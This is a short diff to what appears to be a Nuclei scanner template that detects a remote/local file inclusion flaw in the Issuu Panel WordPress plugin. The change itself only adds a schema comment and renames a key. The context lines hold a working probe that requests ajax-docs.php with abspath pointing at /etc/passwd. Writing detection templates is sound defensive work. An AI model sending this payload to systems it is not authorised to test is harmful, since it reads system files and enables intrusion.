@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: issuu-panel-lfi
 info:
   name: Wordpress Plugin Issuu Panel Remote/Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: wp-plugin,wordpress,lfi,rfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd"
